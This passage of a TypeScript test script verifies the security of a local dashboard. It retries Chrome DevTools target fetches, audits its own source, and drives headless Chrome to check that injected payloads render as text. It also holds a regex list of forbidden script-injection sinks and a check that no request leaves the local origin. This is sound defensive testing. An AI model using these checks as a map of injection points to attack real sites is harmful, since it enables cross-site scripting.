function resolveDebuggerDeadlineMs(options: DebuggerTargetOptions) {
  return options.deadlineMs ?? DEBUGGER_TARGET_MS;
}

async function fetchDebuggerTargets(url: string, signal: AbortSignal, options: DebuggerTargetOptions = {}) {
  const controller = new AbortController();
  let timedOut = false;
  let attempts = 0;
  const onAbort = () => controller.abort();
  signal.addEventListener("abort", onAbort, { once: true });
  const timer = setTimeout(() => {
    timedOut = true;
    controller.abort();
  }, resolveDebuggerDeadlineMs(options));
  try {
    // Chrome can publish DevToolsActivePort before its devtools listener
    // accepts connections, so a refused or reset connection here is transient.
    // Retry in small steps inside the deadline resolved above; a genuinely
    // unavailable endpoint still fails as debugger_target when it expires.
    for (;;) {
      attempts += 1;
      let unparseableBody = false;
      // This catch binds no error on purpose: only fetch and the body read can
      // throw here, neither makes a ProofTimeoutError, and the outer abort and
      // the deadline are decided from their own flags. A guard rethrowing a
      // ProofTimeoutError from this position could never fire.
      try {
        const response = await fetch(url, { signal: controller.signal });
        if (response.ok) {
          const targets = parseDebuggerTargets(await response.text());
          if (targets) return targets;
          unparseableBody = true;
        } else {
          await response.body?.cancel().catch(() => undefined);
        }
      } catch {
        if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
        if (timedOut) throw new ProofTimeoutError("debugger_target");
      }
      // An OK response that is not a target list is a decided answer, so the
      // step ends on it instead of refetching a body that will not change. It
      // is thrown outside the catch above so a transient socket error stays the
      // only thing that retries. The payload detail keeps a broken endpoint
      // distinguishable from a slow one at the process surface, and stays
      // content-free: the stage and the word payload, nothing from the body.
      if (unparseableBody) throw new ProofTimeoutError("debugger_target", "payload");
      await debuggerRetryStep(DEBUGGER_TARGET_RETRY_MS, controller.signal);
      if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
      if (timedOut) throw new ProofTimeoutError("debugger_target");
    }
  } finally {
    clearTimeout(timer);
    signal.removeEventListener("abort", onAbort);
    options.onAttempts?.(attempts);
  }
}

function activeTimerCount() {
  return process.getActiveResourcesInfo().filter((resource) => resource === "Timeout").length;
}

// The catch inside fetchDebuggerTargets must bind no error and must carry no
// ProofTimeoutError guard. Comments are stripped before matching so prose that
// names a forbidden shape cannot red the check, and the patterns tolerate any
// spacing so reformatting cannot either. Stripping is naive on purpose: that
// function holds no string literal containing a slash pair.
function auditFetchSource(source: string) {
  const code = source.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/\/\/[^\n]*/g, " ");
  const catchBindings = code.match(/\}\s*catch\s*\(/g)?.length ?? 0;
  const bindlessCatches = code.match(/\}\s*catch\s*\{/g)?.length ?? 0;
  const timeoutGuards = code.match(/instanceof\s+ProofTimeoutError/g)?.length ?? 0;
  return {
    sourceBytes: source.length,
    codeBytes: code.length,
    catchBindings,
    bindlessCatches,
    timeoutGuards,
    clean: source.length > 0 && bindlessCatches >= 1 && catchBindings === 0 && timeoutGuards === 0,
  };
}

// Drives the real fetchDebuggerTargets against a server that answers 200 with a
// fixed body, and reports a content-free receipt of what came back.
async function probeDebuggerBody(body: string) {
  let requests = 0;
  const server = http.createServer((_request, response) => {
    requests += 1;
    response.writeHead(200, { "content-type": "application/json" });
    response.end(body);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const port = (server.address() as AddressInfo).port;
  const signal = new AbortController().signal;
  const timersBefore = activeTimerCount();
  const startedAt = Date.now();
  let attempts = 0;
  let error: unknown;
  try {
    await fetchDebuggerTargets(`http://127.0.0.1:${port}/json/list`, signal, {
      onAttempts: (count) => { attempts = count },
    });
  } catch (caught) {
    error = caught;
  }
  const elapsedMs = Date.now() - startedAt;
  const timersAfter = activeTimerCount();
  const listeners = getEventListeners(signal, "abort").length;
  const serverClosed = await closeFixtureServer(server);
  return {
    port,
    requests,
    attempts,
    elapsedMs,
    timersBefore,
    timersAfter,
    listeners,
    serverClosed,
    isTimeoutError: error instanceof ProofTimeoutError,
    message: error instanceof Error ? error.message : "missing",
  };
}

// A port held for the check's lifetime by a listener that destroys every
// connection as it arrives, so connects fail the way a closed port does and no
// other process can take the port while the check runs. Freeing the port and
// assuming it stays refused would let another process bind it mid-check.
async function reserveRefusingPort() {
  const holder = http.createServer();
  holder.on("connection", (socket) => socket.destroy());
  await new Promise<void>((resolve) => holder.listen(0, "127.0.0.1", () => resolve()));
  const { port } = holder.address() as AddressInfo;
  return { port, release: () => closeFixtureServer(holder) };
}

// What a second listener gets when it tries to take the same port.
function bindOutcome(port: number) {
  return new Promise<string>((resolve) => {
    const contender = http.createServer();
    contender.once("error", (error: NodeJS.ErrnoException) => resolve(error.code ?? "bind_error"));
    contender.listen(port, "127.0.0.1", () => contender.close(() => resolve("bound")));
  });
}

async function proveDebuggerTargetRetry() {
  // The deadline is a chosen ceiling over the failing hosted run, not a
  // measurement of the interval it governs: see the record above. This asserts
  // exactly that — it exceeds the hosted run that failed, it fits inside the
  // overall wall clock next to the slowest stage ever observed, it leaves
  // enough retry steps, and it is the round number the chosen margin produces.
  const marginDeadlineMs =
    Math.round(DEBUGGER_TARGET_DERIVATION.failingRunSpawnToFirstErrorMs * DEBUGGER_TARGET_DERIVATION.chosenMargin / 1_000) * 1_000;
  const slowestStageMs = Math.max(...Object.values(DEBUGGER_TARGET_DERIVATION.passingRunBrowserStageMs));
  check(
    "debugger_target_deadline_exceeds_the_hosted_run_that_failed_and_fits_the_wall_budget",
    DEBUGGER_TARGET_MS === marginDeadlineMs &&
      DEBUGGER_TARGET_MS > DEBUGGER_TARGET_DERIVATION.failingRunSpawnToFirstErrorMs &&
      DEBUGGER_TARGET_MS + slowestStageMs <= BROWSER_PROOF_WALL_MS &&
      DEBUGGER_TARGET_MS / DEBUGGER_TARGET_RETRY_MS >= 50,
    JSON.stringify({
      deadlineMs: DEBUGGER_TARGET_MS,
      marginDeadlineMs,
      ...DEBUGGER_TARGET_DERIVATION,
      slowestStageMs,
      wallMs: BROWSER_PROOF_WALL_MS,
      retryStepMs: DEBUGGER_TARGET_RETRY_MS,
    }),
  );

  check(
    "debugger_target_deadline_defaults_to_the_shipped_constant_when_none_is_injected",
    resolveDebuggerDeadlineMs({}) === DEBUGGER_TARGET_MS &&
      resolveDebuggerDeadlineMs({ deadlineMs: NEVER_READY_DEADLINE_MS }) === NEVER_READY_DEADLINE_MS &&
      NEVER_READY_DEADLINE_MS < DEBUGGER_TARGET_MS,
    JSON.stringify({
      defaultDeadlineMs: resolveDebuggerDeadlineMs({}),
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      neverReadyDeadlineMs: NEVER_READY_DEADLINE_MS,
    }),
  );

  const proofSource = fs.readFileSync(scriptPath, "utf8");
  const fetchSource = proofSource.slice(
    proofSource.indexOf("async function fetchDebuggerTargets"),
    proofSource.indexOf("function activeTimerCount"),
  );
  const fetchAudit = auditFetchSource(fetchSource);
  check(
    "debugger_target_fetch_catch_binds_no_error_so_a_timeout_guard_cannot_live_there",
    fetchAudit.clean,
    JSON.stringify(fetchAudit),
  );

  // The audit itself, driven over mutated copies of that source: the four
  // formatting and comment shapes that must stay green, and the two real
  // regressions that must stay red.
  const bindlessCatch = "} catch {";
  const auditProbes = [
    { name: "unmodified", source: fetchSource, expected: true },
    { name: "bindless_catch_without_spaces", source: fetchSource.replace(bindlessCatch, "}catch{"), expected: true },
    { name: "bindless_catch_with_extra_space", source: fetchSource.replace(bindlessCatch, "} catch  {"), expected: true },
    { name: "binding_shape_named_in_a_line_comment", source: `${fetchSource}\n// A shape like } catch (error) { is forbidden here.\n`, expected: true },
    { name: "guard_named_in_a_block_comment", source: `${fetchSource}\n/* No instanceof ProofTimeoutError guard belongs here. */\n`, expected: true },
    { name: "catch_binds_an_error", source: fetchSource.replace(bindlessCatch, "} catch (error) {"), expected: false },
    { name: "timeout_guard_readded", source: fetchSource.replace(bindlessCatch, "} catch {\n        if (error instanceof ProofTimeoutError) throw error;"), expected: false },
  ];
  const auditResults = auditProbes.map((probe) => {
    const audit = auditFetchSource(probe.source);
    return { name: probe.name, clean: audit.clean, expected: probe.expected, catchBindings: audit.catchBindings, bindlessCatches: audit.bindlessCatches, timeoutGuards: audit.timeoutGuards };
  });
  check(
    "debugger_target_source_audit_ignores_comments_and_spacing_but_still_catches_a_binding_or_a_guard",
    auditResults.length === 7 && auditResults.every((result) => result.clean === result.expected),
    JSON.stringify(auditResults),
  );

  const pageTarget = { type: "page", webSocketDebuggerUrl: "ws://127.0.0.1/devtools/page/proof" };
  let connections = 0,requests = 0;
  const flaky = http.createServer((_request, response) => {
    requests += 1;
    if (requests < 2) {
      response.writeHead(503, { "content-type": "text/plain" });
      response.end("devtools listener not ready");
      return;
    }
    response.writeHead(200, { "content-type": "application/json" });
    response.end(JSON.stringify([
      { type: "background_page", webSocketDebuggerUrl: "ws://127.0.0.1/devtools/page/background" },
      pageTarget,
    ]));
  });
  // The first connections are accepted then reset the way Chrome's listener
  // behaves before it is ready; the first request it answers is non-OK.
  flaky.on("connection", (socket) => {
    connections += 1;
    if (connections <= 2) socket.destroy();
  });
  await new Promise<void>((resolve) => flaky.listen(0, "127.0.0.1", () => resolve()));
  const flakyPort = (flaky.address() as AddressInfo).port;
  const retrySignal = new AbortController().signal;
  const retryTimersBefore = activeTimerCount();
  const retryStartedAt = Date.now();
  let retryTargets: Array<{ type: string; webSocketDebuggerUrl: string }> | undefined;
  let retryError: unknown;
  try {
    retryTargets = await fetchDebuggerTargets(`http://127.0.0.1:${flakyPort}/json/list`, retrySignal);
  } catch (error) {
    retryError = error;
  }
  const retryElapsedMs = Date.now() - retryStartedAt;
  const retryTimers = activeTimerCount();
  const retryListeners = getEventListeners(retrySignal, "abort").length;
  const flakyClosed = await closeFixtureServer(flaky);
  check(
    "debugger_targets_retry_resolves_after_refused_connections_and_non_ok_responses",
    retryError === undefined &&
      retryTargets?.find((target) => target.type === "page")?.webSocketDebuggerUrl === pageTarget.webSocketDebuggerUrl &&
      connections > 2 &&
      requests > 1 &&
      retryElapsedMs < DEBUGGER_TARGET_MS &&
      retryTimers <= retryTimersBefore &&
      retryListeners === 0 &&
      flakyClosed,
    JSON.stringify({
      error: retryError instanceof Error ? retryError.message : "none",
      targets: retryTargets?.length ?? 0,
      connections,
      requests,
      elapsedMs: retryElapsedMs,
      timersBefore: retryTimersBefore,
      timersAfter: retryTimers,
      listeners: retryListeners,
      serverClosed: flakyClosed,
    }),
  );

  // A 200 whose body is not a target list: the step must end on it, not refetch
  // it until the deadline, and it must not be reported as a deadline expiry.
  const prose = await probeDebuggerBody("devtools listener answered with prose");
  check(
    "debugger_targets_unparseable_ok_body_fails_fast_content_free_without_leaks",
    prose.isTimeoutError &&
      prose.message === "proof_timeout:debugger_target:payload" &&
      !prose.message.includes(String(prose.port)) &&
      !prose.message.includes("127.0.0.1") &&
      !prose.message.includes("prose") &&
      prose.requests === 1 &&
      prose.attempts === 1 &&
      prose.elapsedMs < DEBUGGER_TARGET_MS / 4 &&
      prose.timersAfter <= prose.timersBefore &&
      prose.listeners === 0 &&
      prose.serverClosed,
    JSON.stringify({
      error: prose.message,
      requests: prose.requests,
      attempts: prose.attempts,
      elapsedMs: prose.elapsedMs,
      deadlineMs: DEBUGGER_TARGET_MS,
      retryStepMs: DEBUGGER_TARGET_RETRY_MS,
      timersBefore: prose.timersBefore,
      timersAfter: prose.timersAfter,
      listeners: prose.listeners,
      serverClosed: prose.serverClosed,
    }),
  );

  // A JSON array that is not an array of targets is just as undecodable as
  // prose, so it takes the same payload path instead of reaching the caller.
  const wrongShapes = [
    { name: "array_of_non_target_objects", probe: await probeDebuggerBody(JSON.stringify([{ foo: 1 }])) },
    { name: "array_of_strings", probe: await probeDebuggerBody(JSON.stringify(["a", "b"])) },
  ];
  check(
    "debugger_targets_wrong_shaped_array_fails_fast_through_the_payload_path",
    wrongShapes.every(({ probe }) =>
      probe.isTimeoutError &&
        probe.message === "proof_timeout:debugger_target:payload" &&
        !probe.message.includes(String(probe.port)) &&
        !probe.message.includes("127.0.0.1") &&
        probe.requests === 1 &&
        probe.attempts === 1 &&
        probe.elapsedMs < DEBUGGER_TARGET_MS / 4 &&
        probe.timersAfter <= probe.timersBefore &&
        probe.listeners === 0 &&
        probe.serverClosed),
    JSON.stringify(wrongShapes.map(({ name, probe }) => ({
      name,
      error: probe.message,
      requests: probe.requests,
      attempts: probe.attempts,
      elapsedMs: probe.elapsedMs,
      timersBefore: probe.timersBefore,
      timersAfter: probe.timersAfter,
      listeners: probe.listeners,
      serverClosed: probe.serverClosed,
    }))),
  );

  // Both never-ready checks below run on an injected deadline: they prove a
  // deadline is enforced, which needs no production ceiling, and the shipped
  // constant is pinned by its own checks above.
  const refusing = await reserveRefusingPort();
  const bindWhileHeld = await bindOutcome(refusing.port);
  const deadlineSignal = new AbortController().signal;
  const deadlineTimersBefore = activeTimerCount();
  const deadlineStartedAt = Date.now();
  let deadlineAttempts = 0;
  let deadlineError: unknown;
  try {
    await fetchDebuggerTargets(`http://127.0.0.1:${refusing.port}/json/list`, deadlineSignal, {
      deadlineMs: NEVER_READY_DEADLINE_MS,
      onAttempts: (attempts) => { deadlineAttempts = attempts },
    });
  } catch (error) {
    deadlineError = error;
  }
  const deadlineElapsedMs = Date.now() - deadlineStartedAt;
  const deadlineTimers = activeTimerCount();
  const deadlineListeners = getEventListeners(deadlineSignal, "abort").length;
  const deadlineMessage = deadlineError instanceof Error ? deadlineError.message : "missing";
  check(
    "debugger_targets_unreachable_endpoint_rejects_at_deadline_content_free_without_leaks",
    deadlineError instanceof ProofTimeoutError &&
      deadlineMessage === "proof_timeout:debugger_target" &&
      !deadlineMessage.includes(String(refusing.port)) &&
      !deadlineMessage.includes("127.0.0.1") &&
      deadlineAttempts > 1 &&
      deadlineElapsedMs >= NEVER_READY_DEADLINE_MS &&
      deadlineElapsedMs < NEVER_READY_DEADLINE_MS + ABORT_SETTLE_MS &&
      deadlineTimers <= deadlineTimersBefore &&
      deadlineListeners === 0,
    JSON.stringify({
      error: deadlineMessage,
      attempts: deadlineAttempts,
      elapsedMs: deadlineElapsedMs,
      deadlineMs: NEVER_READY_DEADLINE_MS,
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      timersBefore: deadlineTimersBefore,
      timersAfter: deadlineTimers,
      listeners: deadlineListeners,
    }),
  );

  // The held port answers connections and resets them. A port nothing listens
  // on refuses them instead, which is the condition Chrome actually presents
  // before its devtools listener is up: it must stay transient and retry.
  const vacated = http.createServer();
  await new Promise<void>((resolve) => vacated.listen(0, "127.0.0.1", () => resolve()));
  const refusedPort = (vacated.address() as AddressInfo).port;
  const vacatedClosed = await closeFixtureServer(vacated);
  const refusedSignal = new AbortController().signal;
  const refusedTimersBefore = activeTimerCount();
  const refusedStartedAt = Date.now();
  let refusedAttempts = 0;
  let refusedError: unknown;
  try {
    await fetchDebuggerTargets(`http://127.0.0.1:${refusedPort}/json/list`, refusedSignal, {
      deadlineMs: NEVER_READY_DEADLINE_MS,
      onAttempts: (attempts) => { refusedAttempts = attempts },
    });
  } catch (error) {
    refusedError = error;
  }
  const refusedElapsedMs = Date.now() - refusedStartedAt;
  const refusedTimers = activeTimerCount();
  const refusedListeners = getEventListeners(refusedSignal, "abort").length;
  const refusedMessage = refusedError instanceof Error ? refusedError.message : "missing";
  // Nothing may have taken the freed port meanwhile, or the refusals were not
  // the stimulus under test.
  const refusedPortStillFree = await bindOutcome(refusedPort);
  check(
    "debugger_target_refused_connection_is_transient_and_retried_until_the_deadline",
    refusedError instanceof ProofTimeoutError &&
      refusedMessage === "proof_timeout:debugger_target" &&
      !refusedMessage.includes(String(refusedPort)) &&
      !refusedMessage.includes("127.0.0.1") &&
      vacatedClosed &&
      refusedPortStillFree === "bound" &&
      refusedAttempts > 1 &&
      refusedElapsedMs >= NEVER_READY_DEADLINE_MS &&
      refusedElapsedMs < NEVER_READY_DEADLINE_MS + ABORT_SETTLE_MS &&
      refusedTimers <= refusedTimersBefore &&
      refusedListeners === 0,
    JSON.stringify({
      error: refusedMessage,
      attempts: refusedAttempts,
      elapsedMs: refusedElapsedMs,
      deadlineMs: NEVER_READY_DEADLINE_MS,
      listenerClosed: vacatedClosed,
      portStillFree: refusedPortStillFree,
      timersBefore: refusedTimersBefore,
      timersAfter: refusedTimers,
      listeners: refusedListeners,
    }),
  );

  // A decided-bad payload and an expired deadline must not arrive at the
  // process surface as the same string.
  check(
    "debugger_target_payload_fault_and_deadline_expiry_surface_different_messages",
    prose.message !== deadlineMessage &&
      wrongShapes.every(({ probe }) => probe.message !== deadlineMessage) &&
      prose.message === "proof_timeout:debugger_target:payload" &&
      deadlineMessage === "proof_timeout:debugger_target" &&
      refusedMessage === "proof_timeout:debugger_target",
    JSON.stringify({
      payloadMessage: prose.message,
      wrongShapeMessages: wrongShapes.map(({ probe }) => probe.message),
      deadlineMessage,
      refusedMessage,
      differ: prose.message !== deadlineMessage,
    }),
  );

  const refusingReleased = await refusing.release();
  const bindAfterRelease = await bindOutcome(refusing.port);
  check(
    "debugger_target_refusing_port_held_against_a_competing_bind_and_released_after",
    bindWhileHeld === "EADDRINUSE" &&
      refusingReleased &&
      bindAfterRelease === "bound",
    JSON.stringify({
      bindWhileHeld,
      released: refusingReleased,
      bindAfterRelease,
      deadlineElapsedMs,
    }),
  );
}

async function evaluate<T>(
  cdp: CdpClient,
  expression: string,
  awaitPromise = false,
  signal?: AbortSignal,
): Promise<T> {
  const result = await cdp.send<{
    result?: { value?: T; description?: string };
    exceptionDetails?: { text?: string; exception?: { description?: string } };
  }>("Runtime.evaluate", { expression, awaitPromise, returnByValue: true }, { signal });
  if (result.exceptionDetails) throw new Error(result.exceptionDetails.exception?.description ?? result.exceptionDetails.text ?? "evaluation failed");
  return result.result?.value as T;
}

async function waitForDashboardReady(
  cdp: CdpClient,
  marker: string,
  signal: AbortSignal,
  gate: LoaderGenerationGate,
) {
  const receipt = await waitForDomText({
    probe: async () => {
      const status = await evaluate<string>(cdp, domTextReadinessExpression(marker), false, signal);
      if (status !== "missing" && status !== "mounted" && status !== "ready") {
        throw new Error("readiness_probe_unexpected_status");
      }
      return status;
    },
    delay: (ms) => abortableDelay(ms, signal),
    now: () => Date.now(),
    signal,
    generationCommitted: () => gate.isGenerationCommitted(),
    abortError: () => new ProofTimeoutError("browser_proof_overall"),
  }, { timeoutMs: DASHBOARD_READY_MS, pollMs: 50 });
  if (!receiptIsContentFree(receipt)) throw new Error("readiness_receipt_leaked_content");
  return receipt;
}

function startFixtureServer(html: string, mutations: Array<{ route: string; body: unknown }>) {
  const headers = securityHeaders(html);
  const server = http.createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://127.0.0.1");
    if (request.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
      response.writeHead(200, headers);response.end(html);return;
    }
    if (request.method === "POST" && url.pathname.startsWith("/api/settings/")) {
      const chunks: Buffer[] = [];
      request.on("data", (chunk) => chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)));
      request.on("end", () => {
        let body: unknown = null;
        try { body = JSON.parse(Buffer.concat(chunks).toString("utf8") || "null") } catch { body = "invalid_json" }
        mutations.push({ route: url.pathname, body });
        response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
        response.end('{"ok":true}');
      });
      return;
    }
    const fixtures: Record<string, unknown> = {
      "/api/snapshot": snapshotFixture,
      "/api/settings": settingsFixture,
      "/api/session": sessionFixture,
      "/api/repo": repoFixture,
    };
    if (url.pathname in fixtures) {
      response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
      response.end(JSON.stringify(fixtures[url.pathname]));return;
    }
    response.writeHead(404, { "content-type": "application/json", "x-content-type-options": "nosniff" });response.end('{"error":"not_found"}');
  });
  return server;
}

async function browserProof(html: string) {
  if (!fs.existsSync(chromePath)) throw new Error(`Chrome unavailable at ${chromePath}`);
  const mutations: Array<{ route: string; body: unknown }> = [];
  const fixtureServer = startFixtureServer(html, mutations);
  await new Promise<void>((resolve, reject) => {
    fixtureServer.once("error", reject);fixtureServer.listen(0, "127.0.0.1", resolve);
  });
  const base = `http://127.0.0.1:${(fixtureServer.address() as AddressInfo).port}`;
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-chrome-"));
  const chrome = spawn(chromePath, [
    "--headless=new",
    "--no-first-run",
    "--disable-background-networking",
    "--disable-component-update",
    "--disable-default-apps",
    "--disable-sync",
    "--metrics-recording-only",
    // This synthetic profile must not wait on the macOS user's login keychain.
    "--use-mock-keychain",
    "--remote-debugging-port=0",
    `--user-data-dir=${profile}`,
    "about:blank",
  ], { stdio: "ignore" });
  const controller = new AbortController();
  let cdp: CdpClient | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  let serverClosed = false;
  let cleanupPromise: Promise<void> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, chrome);
    } finally {
      serverClosed = await closeFixtureServer(fixtureServer);
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();
  const operation = (async () => {
    const activePort = path.join(profile, "DevToolsActivePort");
    await waitForFile(activePort, chrome, controller.signal);
    const [debugPort] = fs.readFileSync(activePort, "utf8").split("\n");
    // The interval DEBUGGER_TARGET_MS actually governs. Printed on every run,
    // numbers only, so hosted runs accumulate the distribution that record is
    // still missing.
    const readinessStartedAt = Date.now();
    let debuggerAttempts = 0;
    const targets = await fetchDebuggerTargets(
      `http://127.0.0.1:${debugPort}/json/list`,
      controller.signal,
      { onAttempts: (attempts) => { debuggerAttempts = attempts } },
    );
    const debuggerReadyMs = Date.now() - readinessStartedAt;
    check(
      "browser_debugger_target_readiness_receipt_present_and_numeric",
      Number.isFinite(debuggerReadyMs) &&
        debuggerReadyMs >= 0 &&
        debuggerReadyMs < DEBUGGER_TARGET_MS &&
        Number.isInteger(debuggerAttempts) &&
        debuggerAttempts >= 1,
      JSON.stringify({
        devtoolsActivePortToTargetsMs: debuggerReadyMs,
        attempts: debuggerAttempts,
        deadlineMs: DEBUGGER_TARGET_MS,
      }),
    );
    const page = targets.find((target) => target.type === "page");
    if (!page) throw new Error("Chrome page target unavailable");
    cdp = await CdpClient.connect(page.webSocketDebuggerUrl, { signal: controller.signal });
    const pageErrors: string[] = [],consoleErrors: string[] = [],requests: string[] = [];
    cdp.on("Runtime.exceptionThrown", (params) => pageErrors.push(JSON.stringify(params)));
    cdp.on("Runtime.consoleAPICalled", (params) => { if (params.type === "error" || params.type === "assert") consoleErrors.push(JSON.stringify(params)) });
    cdp.on("Log.entryAdded", (params) => {
      const entry = params.entry as { level?: string; text?: string } | undefined;
      if (entry?.level === "error") consoleErrors.push(entry.text ?? JSON.stringify(entry));
    });
    cdp.on("Network.requestWillBeSent", (params) => {
      const request = params.request as { url?: string } | undefined;if (request?.url) requests.push(request.url);
    });
    await Promise.all([cdp.send("Page.enable"), cdp.send("Runtime.enable"), cdp.send("Network.enable"), cdp.send("Log.enable")]);
    const navigationGate = new LoaderGenerationGate();
    cdp.on("Page.frameNavigated", (params) => {
      const frame = params.frame as { id?: string; loaderId?: string } | undefined;
      if (frame?.id) navigationGate.observe(frame.id, frame.loaderId ?? "");
    });

    const observations: string[] = [];
    for (const viewport of [{ name: "desktop", width: 1280, height: 900, mobile: false }, { name: "mobile", width: 390, height: 844, mobile: true }]) {
      await cdp.send("Emulation.setDeviceMetricsOverride", { width: viewport.width, height: viewport.height, deviceScaleFactor: 1, mobile: viewport.mobile });
      const navigation = await cdp.send<{ frameId?: string; loaderId?: string }>("Page.navigate", { url: `${base}/` });
      if (!navigation.frameId || !navigation.loaderId) throw new Error("navigation_generation_unavailable");
      navigationGate.arm(navigation.frameId, navigation.loaderId);
      const readiness = await waitForDashboardReady(cdp, payloads.html, controller.signal, navigationGate);
      if (!readiness.ok) throw new ProofTimeoutError("dashboard_readiness", readiness.detail);
      check(
        `browser_${viewport.name}_readiness_bounded_content_free`,
        readiness.ok && readiness.elapsedMs <= DASHBOARD_READY_MS && receiptIsContentFree(readiness),
        JSON.stringify(readiness),
      );
      observations.push(await evaluate<string>(cdp, "document.body.textContent"));
      await evaluate(cdp, `openSession(${JSON.stringify(snapshotFixture.sessions[0].sessionId)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, `openRepo(${JSON.stringify(snapshotFixture.repos[0].repoHash)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, "loadSettings()", true);
      observations.push(await evaluate<string>(cdp, `document.querySelector('#settings').textContent + [...document.querySelectorAll('#settings input, #settings option')].map(element=>element.value).join(' ')`));
      await evaluate(cdp, `(async()=>{
        const inputs=[...document.querySelectorAll('#s-accounts input')];
        inputs[0].value=${JSON.stringify(payloads.unicode)};
        inputs[1].value='browser-proof@example.invalid';
        await saveAccountRow('sha256:securityproofaccount',inputs[0],inputs[1]);
        await mergeAccount('sha256:securityproofaccount','sha256:securityproofcanonical');
        await removePrio(${JSON.stringify(payloads.url)});
        await removeSub(0);
        return true;
      })()`, true);
      await evaluate(cdp, `window.__plimsollDashboardTest.drawerError('fixture',new Error(${JSON.stringify(payloads.unicode)}))`);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      const domAudit = await evaluate<{
        handlers: number; urlAttributes: number; activeNodes: number; interactiveRows: number; dialogs: number; testHook: boolean; viewport: number;
      }>(cdp, `({
        handlers:document.querySelectorAll('[onclick],[onchange],[onerror],[onload],[onfocus],[onbegin]').length,
        urlAttributes:document.querySelectorAll('[src],[href],[srcdoc]').length,
        activeNodes:document.querySelectorAll('iframe,object,embed,img,link,base,form').length,
        interactiveRows:document.querySelectorAll('tr.row[tabindex="0"]').length,
        dialogs:document.querySelectorAll('[role="dialog"][aria-modal="true"]').length,
        testHook:Boolean(window.__plimsollDashboardTest),
        viewport:document.documentElement.clientWidth
      })`);
      check(
        `browser_${viewport.name}_dom_inert`,
        domAudit.handlers === 0 &&
          domAudit.urlAttributes === 0 &&
          domAudit.activeNodes === 0 &&
          domAudit.interactiveRows >= 2 &&
          domAudit.dialogs === 2 &&
          domAudit.testHook &&
          domAudit.viewport <= viewport.width &&
          domAudit.viewport >= viewport.width - 20,
        JSON.stringify(domAudit),
      );
    }
    const observed = observations.join("\n");
    check(
      "browser_payloads_render_as_text",
      Object.values(payloads).every((payload) => observed.includes(payload)),
      JSON.stringify(Object.fromEntries(Object.entries(payloads).map(([name, payload]) => [name, observed.includes(payload)]))),
    );
    const outsideRequests = requests.filter((url) => !url.startsWith(base));
    check("browser_zero_network_exfiltration", requests.length >= 8 && outsideRequests.length === 0, JSON.stringify({ requests: requests.length, outsideRequests }));
    const mutationRoutes = new Set(mutations.map((entry) => entry.route));
    check(
      "browser_settings_edits_preserved",
      ["/api/settings/account-label", "/api/settings/account-email", "/api/settings/account-merge", "/api/settings/priority", "/api/settings/subscriptions"]
        .every((route) => mutationRoutes.has(route)),
      JSON.stringify({ requests: mutations.length, routes: [...mutationRoutes] }),
    );
    check("browser_zero_page_console_errors", pageErrors.length === 0 && consoleErrors.length === 0, JSON.stringify({ pageErrors, consoleErrors }));
  })();
  try {
    await runWithBrowserWatchdog({
      operation,
      controller,
      cleanup,
      timeoutMs: BROWSER_PROOF_WALL_MS,
    });
  } catch (error) {
    try { await cleanup(); }
    catch { console.error(JSON.stringify({ proof: "dashboard-security", error: "browser_teardown_failed" })); }
    throw error;
  }
  await cleanup();
  check(
    "browser_process_bounded_teardown",
    shutdownReceipt?.exited === true &&
      shutdownReceipt.durationMs <= BROWSER_PROTOCOL_CLOSE_MS * 2 + BROWSER_SIGNAL_GRACE_MS * 2 + 500 &&
      childHasExited(chrome) &&
      !fs.existsSync(profile) &&
      cdp?.pendingCount === 0 &&
      serverClosed,
    JSON.stringify({
      shutdownReceipt,
      processExited: childHasExited(chrome),
      profileRemoved: !fs.existsSync(profile),
      pendingCommands: cdp?.pendingCount ?? 0,
      serverClosed,
    }),
  );
}

async function main() {
  if (process.env.PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE === "1") {
    const fixtureRoot = process.env.PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT;
    if (!fixtureRoot || !fs.existsSync(fixtureRoot)) throw new Error("timeout_fixture_root_missing");
    const scenario = await runNeverResolvingCdpScenario(fixtureRoot);
    if (scenario.timeoutError instanceof ProofTimeoutError) throw scenario.timeoutError;
    throw new Error("timeout_fixture_did_not_timeout");
  }
  const html = fs.readFileSync(dashboardPath, "utf8"),script = inlineBlock(html, "script");
  const forbidden = [
    ["innerHTML", /\binnerHTML\b/], ["outerHTML", /\bouterHTML\b/], ["insertAdjacentHTML", /\binsertAdjacentHTML\b/],
    ["document.write", /document\.write/], ["inline handler", /\son[a-z]+\s*=/i], ["style attribute", /\sstyle\s*=/i],
    ["style property", /\.style\s*[.=]/], ["eval", /\beval\s*\(/], ["Function constructor", /\bnew\s+Function\b/],
    ["URL-bearing markup", /\s(?:src|href|srcdoc|xlink:href)\s*=/i],
  ] as const;
  const hits = forbidden.filter(([, pattern]) => pattern.test(html)).map(([name]) => name);
  check("static_forbidden_sinks_absent", hits.length === 0, JSON.stringify({ hits }));
  let parseError: string | null = null;
  try { new Function(script); } catch (error) { parseError = String(error) }
  check("dashboard_script_parses", script.length > 5_000 && parseError === null, parseError ?? `script bytes=${Buffer.byteLength(script)}`);
  check(
    "safe_dom_layer_present",
    html.includes("textContent") && html.includes("createElement") && html.includes("createElementNS") && html.includes("addEventListener") && html.includes("replaceChildren"),
    "textContent/createElement/createElementNS/addEventListener/replaceChildren",
  );
  await proveBoundedSignalEscalation();
